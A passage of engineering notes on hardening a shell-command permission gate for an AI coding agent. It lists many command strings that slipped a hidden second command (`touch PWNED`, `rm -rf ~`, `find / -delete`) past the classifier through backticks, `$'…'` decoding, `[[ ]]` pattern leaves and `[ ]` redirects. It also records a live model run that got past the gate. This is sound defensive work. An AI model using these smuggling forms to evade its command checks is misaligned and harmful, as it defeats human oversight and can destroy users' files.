    pinned there (six inner forms in `` echo `…` ``, ``echo $(echo `…`)`` and
    ``ls | grep `…` ``) were ALLOW on `363accf2`, ran in at least three
    shells and ask now; their `rm -rf ~` twins are DENY (classified only).

    **Only raises**, against `363accf2`, under UNKNOWN and POSIX, with
    `classify`'s catch and without it: the #710 sweep (27,021 argv strings,
    2,039,760 forms; its 977 changes are this issue's test rows but for 19
    ASK → DENY on two #742 rows), the 108,960 here-documents (132 ASK → DENY,
    each hiding `find victim -delete` on a line of its own: 118 inside
    backticks, 14 with a backtick on a candidate end line), the 7,560- and
    704-form grids (no change), the 936-form substitution set (10 ASK → DENY), the
    1,531 attack forms (4 ASK → DENY), #762's property test (30,441
    strings, 542,148 variants; none below its unsplit string, and the 192
    that changed are this issue's rows) and a backtick property test
    (24,400 strings embedded in backticks and in `` "`…`" ``, and 465,854
    variants with a `\⏎` inside the backticks): none below `363accf2` and no
    exception, and no variant below its unsplit embedding. On `363accf2` 86
    of the embeddings in backticks were below the verdict the fix gives the
    same command in `$( … )`; now none is.

    **Cost:** of 31,958 strings (#762's 31,822 cost strings and 136
    realistic backtick lines, `.omc/probes/768/impl/corpus/`), one changed:
    ``echo `dirname "\`pwd\`"` `` goes from ALLOW to ASK, as
    ``dirname "`pwd`"``, which the shells run, asks at the top level.
    ``echo `echo \$HOME` ``, ``echo `echo x` `echo y` `` and
    ``echo `date` `` stay ALLOW, ``echo `basename \`pwd\`` `` stays ASK.
    Re-reading with an ASK floor instead would have changed 11 of the
    31,958 (``echo `echo \$HOME` `` among them); the joined reading inside
    backticks and a here-document's `$(…)` changed none of them. **Time**
    (medians of 7, macOS, Python 3.12, `.omc/probes/768/impl/perf/`):
    2,000 ``echo `echo \$x` `` statements (34 KB) 55.9 ms against 31.7 ms
    on `363accf2`; a 12-deep nest of escaped backticks (8 KB) 18.8 ms
    against 1.5 ms and a 16-deep one (131 KB) 202 ms against 19 ms. 2,000
    backtick substitutions a blank apart on one line ask, where `363accf2`
    allowed them: the #768 budget runs out after a few splits. Each split
    re-read the whole source, not the rest of the line, so lines of such
    pairs asked as well and the time grew with the square of the source (the
    round-1 cross-review); fix round 1 below reads the statement.

    **Live** (pty TUI under `auto`, scripted model, scratch HOME, agent dir
    and cwd, `.omc/probes/768/impl/live/`):
    ``echo `echo "${x:-'\$(: > MARK)'}"` `` and
    ``echo `echo x` `touch MARK` `` with `SHELL=/bin/bash`, and the
    `$\\⏎(` row with `/bin/ksh`, ran with no dialog and created `MARK` on
    `363accf2`, and open "Run shell command?" now with nothing created after
    Esc; ``echo `echo \$HOME` `` runs with no dialog on both. A real model
    (OpenRouter `openai/gpt-4.1-mini`) asked to run
    ``echo `echo x` `touch PWNED` `` under `--permission-mode auto -p` with
    `AELIX_SUBAGENT_DEPTH=1`, the headless block gate, ran it and created
    `PWNED` on `363accf2`, and is refused now; plain `-p` runs it on both,
    as it runs every ASK (ADR-0120, #740).

    **Not covered:** a `$'…'` argument is not decoded (``echo `find .
    $'-de\⏎lete'` `` asks, as `find . $'-delete'` does); a backtick
    tree-sitter leaves inside an `ERROR` node is not read
    (``echo ${y:-`echo \$(rm -rf ~)`}`` asks); backticks in a here-document
    body whose `\"` reading the re-read of the body cannot rebuild
    (``cat <<E⏎`echo \"${x:-'\$(rm -rf ~)'}\"`⏎E``, whose `: > MARK` twin
    ran in dash on macOS and Linux and in both ksh93 builds) ask and are not refused;
    ``echo `echo $(\\⏎(echo '$(rm -rf ~)'))` `` asks, as the same command
    does at the top level; a backtick inside `$((…))`, `$[…]` or `${a[…]}`
    within `"…"` is not read with `\"` undone, because the nearest node there
    is not the string, so ``echo "$[ `echo \"'\$(: > MARK)'\"` ]"`` (macOS
    bash, dash and ksh93u+, Linux bash, dash, ksh 93u+m and mksh created
    MARK) and the `$((…))` spelling (dash and ksh93, macOS and Linux) ask, as
    on `363accf2`, and their `rm -rf ~` twins are not refused (the round-1
    cross-review; fix round 1 re-ran both). Windows Git Bash, bash 5.3 and the
    shells' interactive modes were not measured.

    **Fix round 1 (2026-11-12).** #768's own findings (the round-1 verify
    and cross-review, `.omc/probes/768/fix-r1/`, measured as above in the
    nine shells):

    - *A pattern leaf.* tree-sitter keeps the right side of `=`, `==` or
      `=~` in `[[ … ]]`, and of `=~` in `[ … ]`, as a `regex` leaf, and a
      `@(…)` pattern as an `extglob_pattern` leaf, so no walk read a
      substitution in it: ``[[ x = `:>MARK` ]]`` and ``[ x =~ `:>MARK` ]`` were
      ALLOW on `363accf2` and `78df9ce4` and created `MARK` in all nine (dash,
      which has no `[[`, expands the words of its `[[` command), and the
      verify's other eight leaf rows in six to eight. Such a leaf holding a
      backtick, `$(`, `${`, `$[`, `<(` or `>(` is read as an `echo` argument,
      bare and in double quotes, and the higher verdict counts
      (`_pattern_verdict`): all 15 pinned rows ask, the six `rm -rf ~` and
      `find . -delete` rows beside them are DENY, and
      `[[ $x =~ ^${re}$ ]]` stays ALLOW.
    - *The backtick reading in one pass.* `_unescaped` made one insert per
      kept `\$`, 1.9 s for 240,000 `\$\a` (960 KB) on `78df9ce4`; it is
      built in one pass now (100 ms; 18.9 ms on `363accf2`, which made no
      such reading) and equals the old reading on 20,000 random strings.
    - *The split read in its statement.* A split view of the whole source
      held every other line's merged pair: five lines of
      ``echo `ls a` `ls b` `` asked on `78df9ce4` (ALLOW on `363accf2`), and
      360 KB of ``:`a` `b` `` took 19.1 s. The view is now the innermost
      statement around the pair (`_STATEMENT_PARENTS`); in a command
      tree-sitter rejects it stays the whole source, which also reads the
      statements around the error, as on `78df9ce4`. A view the budget cannot
      pay is not built and asks. The five-line script is ALLOW again (the
      360 KB one asks on every tree: `a` and `b` are unknown commands); 360 KB
      takes 1.36 s (613 ms on `363accf2`).
    - *Pins* for the rows the verify's mutants M34, M03 and M23 changed, and
      for this round's own.

    The lead's call, not the owner's: four holes older than #768, of the same
    class, that both reviews found and the lead confirmed on main
    `52b2031b` (`.omc/probes/768/lead-check/`), and the verify's O1. Each was
    ALLOW on `363accf2` and `78df9ce4`:

    - ``echo "$ $(: > MARK)"``, with a tab or a newline for the blank, and
      the same line in an expanded here-document body, created `MARK` in all
      nine: tree-sitter reads `$`, blanks and `$` as `$$`, taking the `$` of
      `$(`. That `$` is escaped and the command re-read, and it asks at
      least; ``echo "$\⏎$(: > MARK)"``, which is `$$` to the shells too (none
      ran it), stays ALLOW.
    - ``echo == ; : > MARK ; ]`` created `MARK` in bash, dash, both ksh93 and
      mksh (zsh stops at `==`): after `==` or `=~` in a command's arguments
      tree-sitter reads up to a `]` word as one `regex` node. The operator is
      quoted and the command re-read, and it asks at least.
    - `find / -de""\lete` and `find . -ex""\ec rm -rf {} +` (classified only;
      `printf '[%s]'` printed `[-delete]` and `[-exec]` in all nine):
      tree-sitter ends a word at a backslash after a quote. The escaped byte
      is quoted instead (`-de""'l'ete`), and both are DENY.
    - `[ a > MARK ]` created `MARK` in all nine: tree-sitter reads `>`, `>>`
      and `<` inside `[ … ]` as comparisons. The brackets are read as a
      `test` command, so `[ a > ~/.bashrc ]` is DENY as
      `echo a > ~/.bashrc` is and `[ a < b ]` stays ALLOW. `[[ a > MARK ]]`
      created `MARK` in dash alone, which has no `[[`; under the POSIX
      dialect, which the gate uses for every POSIX shell, it reads as a
      redirect too and asks, and under UNKNOWN it stays ALLOW.
    - ``echo "${x:-$'\x24(: > MARK)'}"`` created `MARK` in macOS bash 3.2.57
      and Linux bash 5.2.37 only: bash decodes a `$'…'` in a `${…}` operand
      inside double quotes and expands the result again. Such a `$'…'` asks,
      and its decoded text is re-read (`_ansi_c_decoded`), so the
      `rm -rf ~` twins are DENY. Unquoted, no shell ran it (ALLOW stays). A
      `$'…'` in a pattern operand (`#`, `%`, `/`) was not covered: fix
      round 2 below.

    These readings are paid from a third budget (`_MISREAD_BUDGET`, as large
    as the other two); fix round 2 below pays the #768 readings nested in
    them from it too and measures what that leaves the others. In a pty TUI under `auto` with `SHELL=/bin/bash`
    (`.omc/probes/768/fix-r1/live/`), ``[[ x = `:>MARK` ]]``,
    ``echo "$ $(: > MARK)"``, ``echo == ; : > MARK ; ]`` and `[ a > MARK ]`
    ran with no dialog and created `MARK` on `363accf2`, and open "Run shell
    command?" now with nothing created after Esc; ``echo "cost: $ 5"`` runs
    with no dialog on both. OpenRouter `openai/gpt-4.1-mini` asked under
    `--permission-mode auto -p` with `AELIX_SUBAGENT_DEPTH=1` to run
    ``echo "$ $(touch PWNED)"`` created `PWNED` on `363accf2` and is refused
    now; plain `-p` runs it, as it runs every ASK (#740).

    **Only raises**, against `363accf2` and `78df9ce4`, under UNKNOWN and
    POSIX, with `classify`'s catch and without it: the #710 sweep (27,106
    argv strings, 2,047,110 forms; every change against `78df9ce4` comes from
    one of this round's 46 test rows), the 108,960 here-documents, the
    7,560-, 936- and 704-form sets (16 of the 936 ASK → DENY), the 1,531
    attack forms (the `[ FOO < 1 -eq 1 ]` and `[ 1 -eq 1<<FOO ]` spellings
    of #743's grid ALLOW → ASK, as the shells redirect there), #762's
    property test (543,819 variants), the backtick property test (467,304
    variants), the
    round-1 verify's fuzz (345,000 forms, and 345,000 more with this round's
    shapes) and 300,000 of the cross-review's differential strings (and
    160,000 more without the catch): none below either, and no exception.
    The fuzz strings this round allows that hold `MARK` were run in macOS
    bash, zsh, dash and ksh93u+ (4,494) and the `printf` twins of the
    argument fuzz (740): none created `MARK` or printed `[-delete]`.
    **Cost:** of the 31,958 strings above, none changed against `78df9ce4`,
    nor any of the verify's 6,145 (1,361 real script lines among them); of
    77 fresh lines written for these rules, three ask now:
    ``echo "Total: $ $total"`` (the stray `$`), ``echo "${x:-$'\n'}"`` and,
    under POSIX, `[[ "$a" > "$b" ]]`. ``echo x == y ]`` and
    ``echo $(echo a == b)``, where tree-sitter reads a `regex` that hides
    nothing, ask too. **Time** (medians of 7, macOS, Python 3.12,
    `363accf2` / `78df9ce4` / now): 4,000 lines of ``echo `ls a` `ls b` ``
    (76 KB) 86 / 709 / 218 ms; a tree tree-sitter rejects, `(` and 20,000
    ``:`a` `b` `` lines (180 KB), 40 / 4,960 / 1,021 ms; 20,000 glued words
    (220 KB) 246 / 231 / 550 ms. *Not covered:* ``echo ${x:-\\`: > MARK``,
    with no closing brace, created `MARK` in macOS ksh93u+ 2012 alone, which
    closes an open backtick at the end of input; tree-sitter rejects it, so
    it asks, while ``echo ${x:-\\` : > MARK}`` is ALLOW and ran in none of the
    nine.

    **Fix round 2 (2026-11-12).** The round-2 verify's findings
    (`.omc/probes/768/fix-r2/`, measured as above in the nine shells):

    - *The misread budget.* A #768 reading nested in a misread reading still
      paid from `_BACKTICK_BUDGET`: ten lines of
      ``echo `[[ x =~ (\`echo \\$a\` …) ]]` `` spent 9,350 of the 9,372
      bytes of `_BACKTICK_BUDGET`, so the ``echo `echo "${x:-'\$(rm -rf ~)'}"` `` before them asked
      on `866b0e5b` (DENY on `78df9ce4`). `_misread_reread` pays them from
      `_MISREAD_BUDGET` now, and that 1,354-byte command is DENY again.
      Measured on 46,309 strings (the 31,958 above, the round-2 verify's
      16,649 and this round's rows) and on 147,481 (the 31,958 with the
      here-documents and the 7,560-, 936- and 704-form sets), under UNKNOWN
      and POSIX: the `_REREAD_BUDGET` bytes left after `classify` are those
      left on `363accf2`, and the `_REREAD_BUDGET` and `_BACKTICK_BUDGET`
      bytes left are those left with the misread readings taken out (on
      `866b0e5b` the `_BACKTICK_BUDGET` ones differed for 4 of the 46,309).
      So the misread readings take nothing from the others. The #742 and #762
      re-reads share `_REREAD_BUDGET`, as on `363accf2`, and #768's two
      (`_backtick_unescaped_verdict`, `_substitution_joined_verdict`) share
      `_BACKTICK_BUDGET`, as on `78df9ce4`.
    - *A `$'…'` in a pattern operand.* tree-sitter keeps a `${…}` pattern
      operand (after `#`, `##`, `%`, `%%`, `/`, `//`, `/#`, `/%`, `^` or `,`)
      as text in a `regex` leaf, so the `$'…'` rule above did not see one
      there: ``echo "${PWD#$'\x24(: > MARK)'}"``, its seven other pattern
      operators, `PATH`, the `\044`, `\\\$` and `\x60` spellings, `@(…)`,
      and the forms nested in `${x:-…}` and `${PWD:+…}` (19 rows) were ALLOW
      on `363accf2` and `866b0e5b` and created `MARK` in macOS bash 3.2.57
      alone; Linux bash 5.2.37 ran none. Each `$'…'` in such a leaf, and one
      the leaf ends before its closing quote
      (``echo "${PWD#$'\x24(: > MARK)}'}"``, where bash reads on to the
      quote), asks now and is re-read decoded (`_decoded_quotes_verdict`),
      so the `rm -rf ~` twins are DENY. That holds in an expanded
      here-document body too, where none of the nine ran it. Unquoted, or in
      a `"…"` of its own inside the operand, none ran it, and both stay
      ALLOW.
    - *An escaped substitution ksh93 runs* (the lead's call, not the
      owner's; older than #768). ``[[ x =~ \$(: > MARK) ]]`` and nine
      other spellings (`a\$(`, `x\$(`, `(\$(…))`, `^\$(…)$`,
      `\$( : > MARK )`, a `|` on either side, `-n x && x =~ \$(…)` and
      `\$(…) && 1`) were ALLOW on `363accf2` and `866b0e5b` and created
      `MARK` in macOS ksh93u+ and Linux ksh 93u+m alone. A pattern leaf (the
      rule above) holding `\$(`, `\${` or `` \` `` asks now, and is also
      read with those backslashes removed (`_ksh_unescaped`), so the
      `rm -rf ~` twins are DENY. Of the 860 real lines holding `[[` (the
      round-2 verify's system script lines and the round-1 verify's real
      lines) and the 658 `[[ … ]]` expressions in them, 23 with `=~`, each
      classified alone, none changed against `866b0e5b`.
    - *Lists and pipelines.* A member of an `&&` / `||` list or of a
      pipeline is a statement of its own for the split view now: four
      ``echo `ls a` `ls b` `` joined by ` && `, ` || ` or ` | ` asked on
      `866b0e5b` and are ALLOW again, as on `363accf2`, up to 400 members
      measured (500 joined by ` && ` or ` || ` ask on all three trees; 500
      joined by ` | ` are ALLOW on `363accf2` and now and ask on
      `866b0e5b`, `.omc/probes/768/finish/out/f2-claims.txt`). One command
      holding 13 or more such pairs still asks (12 are ALLOW, and all are ALLOW on `363accf2`):
      the #768 budget runs out.
    - *Pins* for the rows the verify's mutants M15 and M16
      (``case x in x) echo `echo x` `rm -rf ~`;; esac`` stays DENY) and M17
      (``cat <(``, six lines of ``echo `ls a` `ls b` ``, `)` stays ALLOW)
      changed.

    **Only raises**, against `363accf2`, under UNKNOWN and POSIX (the #710
    sweep under UNKNOWN), with `classify`'s catch, and without it for all
    but the split-word, pattern, combination and script fuzz: the #710
    sweep (27,156 argv strings, 2,050,920 forms), the 108,960
    here-documents, the 7,560-, 936- and 704-form sets, the 1,531 attack
    forms, #762's property test (545,115 variants), the backtick property
    test (468,517 variants) and the round-2 verify's fuzz (30,000 split
    words, 60,000 pattern right sides, 60,000 combinations, 60,000
    token-soup strings and 14,000 scripts): none below `363accf2` and no
    exception. Against `866b0e5b` the only verdicts in these sweeps that
    went down are list rows of the kind above (177 #710-sweep forms and 64
    #762 property variants, ASK → ALLOW, each ALLOW on `363accf2`); the
    round-3 verify found DENY → ASK rows outside them (the finish below). The 867 fuzz strings
    this round allows that hold `MARK` were run in all nine shells: none
    created it. **Cost:** of the 31,958 strings, none changed against
    `866b0e5b`; of the round-2 verify's 16,649, one: ``echo "${x#$'\r'}"``
    asks now. **Time** (medians of 7, macOS, Python 3.12, load average 7 to
    10, `363accf2` / `866b0e5b` / now): the round-2 verify's 23 shapes are
    within 4 % of `866b0e5b`; 20,000 lines of
    ``echo "${PWD#$'\x24(a)'}"`` (500 KB) 351 / 415 / 521 ms; 20,000 lines
    of `[[ x =~ \$(a) ]]` (340 KB) 187 / 245 / 611 ms; one 96 KB pattern of
    `\$(a)|` 1.5 / 5.0 / 216 ms; 4,000 ``echo `ls a` `ls b` `` joined by
    ` | ` (84 KB) 99 / 436 / 224 ms.

    **Live** (pty TUI 120x40 under `auto`, scripted model, scratch HOME,
    agent dir and cwd, `.omc/probes/768/fix-r2/live/`):
    ``echo "${PWD#$'\x24(: > MARK)'}"`` with `SHELL=/bin/bash` (macOS bash
    3.2.57) and `[[ x =~ \$(: > MARK) ]]` with `/bin/ksh` ran with no dialog
    and created `MARK` on `866b0e5b`, and open "Run shell command?" now with
    nothing created after Esc; four ``echo `ls a` `ls b` `` joined by
    ` && ` opened it on `866b0e5b` and run with no dialog now;
    ``echo "cost: $ 5"`` runs with no dialog on both. *Not covered:* a
    `$'…'` in an offset, not a pattern: ``echo "${x:$'\x24(: > MARK)'}"``
    created `MARK` in Linux mksh alone and
    ``echo "${PWD:0:$'\x24(: > MARK)'}"`` in macOS bash 3.2.57, Linux bash
    5.2.37 and mksh; tree-sitter rejects both, so they ask, as on
    `363accf2`, and their `rm -rf ~` twins ask too rather than being refused.

    **Finish (2026-11-12).** The round-3 verify's findings
    (`.omc/probes/768/verify-r3/`), measured in `.omc/probes/768/finish/`:

    - *A `$'…'` after an escaped brace* (the verify's F1; the lead's call,
      not the owner's; older than #768). tree-sitter ends a `${…}` at a `}` after a backslash
      (`\}`, `[\}]`, `[a\}]`, `[!\}]`, `\{\}`), where bash reads on, so a
      `$'…'` bash decodes in that operand falls into the string's own text,
      which no rule read: ``echo "${PWD#\}$'\x24(: > MARK)'}"`` and the
      verify's 51 other spellings were ALLOW on `363accf2` and `1a83896b`
      and created `MARK` in macOS bash 3.2.57, the 18 with a `:-`, `-`,
      `:+`, `+`, `:?` or `?` operand in Linux bash 5.2.37 too. Each `$'` in
      the text of a `"…"` or here-document body that holds a `${…}` asks
      now, and its `$'…'` is re-read decoded as a pattern operand's is
      (`_quoted_text_verdict`): all 52 ask under UNKNOWN and POSIX, their
      `rm -rf ~` twins are DENY, and none of the 508 forms of the verify's
      four tables that ran in a shell is ALLOW. A here-document whose
      delimiter is quoted has no `${…}` child and is not read. **Cost:** of
      the 31,958 and 16,649 strings above and the round-3 verify's 14,428
      real script lines on this machine, none changed against `1a83896b`;
      ``echo "${x}: $'a'"``, which macOS bash, zsh, dash and ksh93u+ print
      as text, asks, and so does such a `$'…'` in an expanded here-document
      body, which those four did not run.
    - *The misread budget* (the verify's F3). Paying the nested readings
      from `_MISREAD_BUDGET` left the edited re-read of the whole source too
      little: after three lines of ``echo `[[ x =~ (\`echo \\$a\` …) ]]` ``,
      ``echo "$ $(rm -rf ~)"`` asked on `1a83896b` (DENY on `866b0e5b`,
      ALLOW on `363accf2`). `_MISREAD_BUDGET` now holds three times the
      other two (`_MISREAD_SHARE`, the lead's call: the smallest whole
      multiple that holds at 3 and 10 lines): that row, `[ a > ~/.bashrc ]`,
      `find / -de""\lete`, `echo == ; rm -rf ~ ; ]` and
      ``echo "${x:-$'\x24(rm -rf ~)'}"``, after and before 3 and 10 such
      lines, are DENY under UNKNOWN and POSIX, as on `866b0e5b`; twice the
      size held at 3 lines and not at 10. After 20 or 40 lines the first
      four still ask (DENY on `866b0e5b`); four times, set by hand, holds
      them there and was not applied. On the verify's 4,338 strings the `_REREAD_BUDGET` and
      `_BACKTICK_BUDGET` bytes left after `classify` are still those left
      with the misread readings taken out.
    - *A list-fuzz budget edge, left as it is* (the lead's call, not the
      owner's). One of the verify's list-fuzz forms, which it minimised to
      ``` o `a``;` `rm -rf ~` || ` a`` b` "`b`" echo `'`'` `:>echo "RK)" |& tiho ` `b` } ```,
      is ASK on `363accf2`, DENY on `866b0e5b` and ASK on `1a83896b` and
      now, under UNKNOWN and POSIX, both spellings. With `list` in
      `_STATEMENT_PARENTS` its split views are paid before the
      substitution's own text, and on `1a83896b` 2 bytes of the #768 budget
      were left when the `rm -rf ~` reading came (17 on `866b0e5b`; the
      verify's trace). Taking `list` out restored its DENY there, and the
      verify's mutant N01, which takes it out, fails the list rows above,
      so `list` stays. It is never below `363accf2`, and its `MARK` twin ran
      in macOS ksh93u+ alone.
    - *A long ksh93 reading* (the verify's F5). tree-sitter's error recovery
      on the ksh93 reading of `[[ x =~ \$(a)|…| ]]`, a trailing `|`
      included, grew with the square of its size: 12.4 s for 96 KB on
      `1a83896b` (the verify, one run). A reading longer than 4,096 bytes
      (`_KSH_REREAD_LIMIT`) asks without being read: 96, 192 and 384 KB of
      that shape take 6.6, 13.2 and 26.5 ms now, and fix round 2's 96 KB
      pattern without the trailing `|` 6.8 ms (216 ms on `501f8cf1`). One
      4 KB reading takes 31 ms on `1a83896b` and now. No pattern leaf of
      the 63,035 strings above holds such an escape, and the longest among
      the test file's string constants is 17 bytes.
    - *A pin* for the verify's surviving mutants N19 and N20:
      ``echo "${PWD/$'\'\x24(rm -rf ~)'/b}"`` is DENY (classified only; its
      `MARK` twin ran in none of the nine shells), and it alone fails under
      each of them.

    **Only raises**, against `363accf2`, under UNKNOWN and POSIX (the #710
    sweep under UNKNOWN), with `classify`'s catch and, for all but the list
    fuzz, without it: the #710 sweep (27,184 argv strings, 2,052,540
    forms), the 108,960 here-documents, the 7,560-, 936- and 704-form sets,
    the 1,531 attack forms, #762's property test (545,847 variants), the
    backtick property test (469,251 variants) and the verify's list fuzz
    (36,000 forms, seeds 1 to 3) and token-soup fuzz (45,000 strings): none
    below `363accf2` and no exception. Against `1a83896b` every change is a
    raise of a new test string of this finish: 361 #710-sweep forms of its
    19 one-line rows (ALLOW → ASK), 503 #762 property variants of 21 of its
    strings (498 ALLOW → ASK, 4 ASK → DENY, 1 ALLOW → DENY) and 556
    backtick-property embeddings and variants of 19 (ALLOW → ASK); the
    here-documents, the sets, the attack forms and the 31,958 strings
    changed nothing, and the two fuzzers found nothing lower. The 1,308
    token-soup strings that hold `MARK` and are ALLOW now are among the
    1,312 the verify ran in all nine shells, none of which created it. Against `866b0e5b` the list fuzz
    found the form above (DENY → ASK) and list rows of the kind in fix
    round 2 (ASK → ALLOW, each ALLOW on `363accf2`).

    **Time** (medians of 3, macOS, Python 3.12, load average 7 to 9,
    `363accf2` / `866b0e5b` / `1a83896b` / now): 20,000 lines of
    ``echo "${PWD#$'\x24(a)'}"`` 356 / 415 / 531 / 566 ms; 40,000 lines of
    `[[ x =~ \$(a) ]]` 384 / 478 / 1,223 / 1,216 ms; 4,000
    ``echo `ls a` `ls b` `` joined by ` | ` 102 / 443 / 223 / 231 ms; 4,000
    lines of ``echo "${x:-[\}]$'\x24(a)'}"`` 83 / 94 / 96 / 120 ms; 320 of
    the pad lines above and a misread twin 6.5 / 175 / 160 / 476 ms, linear
    (67, 129, 245 and 476 ms for 40, 80, 160 and 320 lines). Lists of pipelines of split
    pairs grow with the square of their size, as on `363accf2` (829 and
    3,383 ms there, 800 and 3,366 ms now, for 98 and 196 KB); no other
    shape the verify timed grew faster than its size.

    **Live** (pty TUI 120x40 under `auto`, scripted model, scratch HOME,
    agent dir and cwd, `SHELL=/bin/bash`, `.omc/probes/768/finish/live/`):
    ``echo "${PWD#\}$'\x24(: > MARK)'}"`` ran with no dialog and created
    `MARK` on `1a83896b`, and opens "Run shell command?" now with nothing
    created after Esc; ``echo "cost: $ 5"`` runs with no dialog.
  - **Dated note 2026-11-10 (#743).** **An arithmetic operand of `[ … ]` or
    `[[ … ]]` is asked about as an operand of `test` is: it asks unless it is
    a plain decimal number, a lone numeric expansion (`$#`, `"${#a[@]}"`)
    or a `$((…))` holding only digits, blanks and operator characters; a
    bare name asks (fix round 2). The operands judged are the words beside
    each arithmetic operator as tree-sitter splits them, and a token it
    splits off an operand (a sign, `!`, `~` or `(`, or `-FOO` read as an
    operator) asks unless it is a `-` or `+` before a plain number on the
    right, or `[`, `[[`, `!`, `(`, `&&`, `||`, `-a` or `-o` on the left
    (fix round 3). A glob anywhere in `[ … ]` or `test`, or a ksh pattern
    (`!(`, `@(`, `+(`, `?(`, `*(` or `~(`) in `[ … ]`, asks. An unquoted
    expansion in `[ … ]` that the shell splits into operators, and the
    values listed under "Not covered here", are not covered.** bash (`[[`) and
    ksh93 (`[` and `[[`) evaluate an operand of `-eq`, `-ne`, `-lt`, `-le`,
    `-gt` or `-ge` as an arithmetic expression, array subscripts included:
    `[[ 1 -eq 'a[$(touch PWNED)]' ]]` created `PWNED` in bash 3.2.57, bash
    5.2.37 and macOS ksh93u+, and `[ 1 -eq 'a[$(touch PWNED)]' ]` in macOS
    ksh93u+, for all six operators on either side (measured with
    `<shell> -c` on macOS and in Linux docker; zsh 5.9, dash and Linux ksh
    93u+m/1.0.10 ran none; `.omc/probes/743/impl/`). Both were ALLOW on
    `b160b8f7` while `test 1 -eq 'a[$(touch PWNED)]'` asked: tree-sitter
    makes `[ … ]` a `test_command` like `[[ … ]]`, never a `command`, so
    ADR-0288's "`test` / `[` command" check reached only `test`, and the
    `test_command` check asked only about expansions and assignments.
    `_test_operands_evaluate` now reads a `test_command`'s words in source
    order, whatever tree-sitter grouped them into (it reads
    `[ ! 1 -ge x -a 2 -eq 3 ]` as `((! 1 -ge x) -a 2) -eq 3`), and judges
    each word beside an arithmetic operator with `_arith_operand_danger`.
    `$'a[$(…)]'` and `"a[\$(…)]"`, which ran `touch` the same way, ask.

    **Fix round 1 (2026-11-10): rules that only raise.** The round-1 verify
    and a Codex review found operands and globs the first version let
    through; each is now closed by a rule that can only make the verdict
    ASK, measured in the same eight shells, in an empty directory and again
    with files `+1`, `-eq` and `a[$(touch PWNED)]` planted
    (`.omc/probes/743/fix-r1/`):
    - *A bare name was safe only if nothing on the line could have put
      text in it* (fix round 2 replaces this: every bare name asks). bash
      fills `_` with the previous command's last argument and
      `BASH_REMATCH` with what `=~` matched, and evaluates their value again:
      `[[ 'a[$(touch PWNED)]' =~ .* && BASH_REMATCH -eq 0 ]]`,
      `echo 'a[$(touch PWNED)]'; [[ 1 -eq _ ]]` and
      `echo 'a[$(touch PWNED)]'; [ 1 -eq $((_)) ]` created `PWNED` in bash
      3.2.57 and 5.2.37 (zsh, dash and ksh did not) and were ALLOW. Round 1
      made a name ask when bash 5.2's manual lists it as set by the shell
      (`_`, `BASH_REMATCH`, `REPLY`, `MAPFILE`, `OPTARG`, `BASH_ARGV`,
      `BASH_COMMAND`, `FUNCNAME`, …), or when the line assigned, read into
      or matched into anything (`=~` anywhere, an assignment or
      declaration, a `for` / `select`, or a command such as `read`,
      `mapfile`, `getopts`, `printf`, `wait`, `let`, `eval` or one whose
      name is not known). An explicit setter was already ASK on `61eda564`
      by itself (`x=…`, `read x`, `printf -v x`, `declare`, `local`,
      `export`, `for x in`, `getopts`, `mapfile`; bash 5.2 ran each, bash
      3.2 each but `mapfile`, which it lacks), and still is.
    - *A glob anywhere in `[ … ]` or `test` asks* (`_has_unquoted_glob`):
      with the files planted, macOS ksh93u+ created `PWNED` for `[ * ]`,
      `[ ! * ]`, `[ * = x ]`, `[ 1 = 1 -a * ]`, `[ 1 -o * ]`, `[ "$x"* ]`,
      `test *`, `test ! *` and `test 1 -o *`, and for `test 1 *` with only
      `-eq` and `a[$(touch PWNED)]` planted (Codex); all were ALLOW. No
      other shell ran them, nor Linux ksh 93u+m. `[[` does not glob: no
      shell ran `[[ x == * ]]`, `[[ * == x ]]`, `[[ x =~ * ]]` or
      `[[ 1 -eq * ]]` with the files planted, and the pattern side of `==`
      is matched, not expanded, so those stay as they were.
    - *A `$((…))` operand counted as static only with no `$`, backtick,
      quote, backslash or `[` inside, and its names followed the rule above*
      (`_arith_expansion_danger`; fix round 2 narrows it to digits, blanks
      and operator characters). Codex: `[ 1 -eq $(( '$(touch PWNED)' )) ]`
      and its `[[` form created `PWNED` in bash, zsh, dash and ksh93 on both
      systems, and `[ 1 -eq $(( "a[\$(touch PWNED)]" )) ]` in macOS
      ksh93u+; tree-sitter keeps that `$(…)` inside a string node
      `_arith_danger` does not read, and all were ALLOW.
    - *An operand is a plain decimal number*, not one of `_SAFE_INDEX`'s
      subscript forms: `[ 1 -eq '1,2' ]`, `[[ 1 -eq '1,2' ]]`,
      `test 1 -eq '1,2'`, `[[ 1 -eq '*' ]]` and `[[ 1 -eq * ]]` ask (no
      shell ran anything for them).

    **Fix round 2 (2026-11-10).** Measured with `<shell> -c` in the same
    eight shells and in Linux mksh 59c, which is in `_CLASSIFIABLE_SHELLS`
    too: empty, with the three files planted, and with `FOO` and
    `EVIL_API_KEY` set to `a[$(touch PWNED)]` in the environment
    (`.omc/probes/743/fix-r2/`).
    - *Every bare name asks* (`_arith_word_danger`). This is the lead's
      call in this round, not the owner's, and the owner can loosen it.
      The environment can hold the text: aelix's own `load_dotenv` puts a
      cloned repository's `*_API_KEY` names into the process environment
      before the trust check, and every bash call inherits it. With the two
      variables set, `[[ FOO -eq 0 ]]`, `[[ 1 -eq FOO ]]`,
      `[[ EVIL_API_KEY -eq 0 ]]`, `[[ 1 -eq $((FOO)) ]]`,
      `[ 1 -eq $((FOO)) ]` and `test 1 -eq $((FOO))` created `PWNED` in
      bash 3.2.57 and 5.2.37, macOS ksh93u+ and mksh, and `[ 1 -eq FOO ]`,
      `test 1 -eq FOO` and `[ 1 -eq EVIL_API_KEY ]` in macOS ksh93u+ and
      mksh; zsh, dash and Linux ksh 93u+m ran none. All but
      `test 1 -eq $((FOO))` were ALLOW on `ce3cc695`. This replaces round
      1's exception for names nothing on the line could have filled, and
      its two lists. A `$((…))` operand is static only when it holds
      nothing but digits, blanks and operator characters
      (`_STATIC_ARITHMETIC`), so a name, `$`, backtick, quote, backslash or
      `[` in it asks. `$#`, `"$#"`, `$?`, `"${#x}"`, plain decimal numbers
      and a `$((…))` such as `$((1+1))` stay ALLOW.
    - *A ksh pattern in `[ … ]` asks* (`_has_extglob`). tree-sitter reads
      `!(x)` as `!` and a parenthesised group, which the glob rule above
      did not see. With the three files planted, `[ !(x) ]`, `[ ! !(x) ]`,
      `[ !(x) = y ]`, `[ !(x) -eq 1 ]`, `[ 1 = 1 -a !(x) ]`, `[ !(\-) ]`
      and `[ !(x) ] && echo hi` created `PWNED` in macOS ksh93u+ and mksh,
      and `[ 1 -o !(x) ]` in macOS ksh93u+; all were ALLOW on `ce3cc695`.
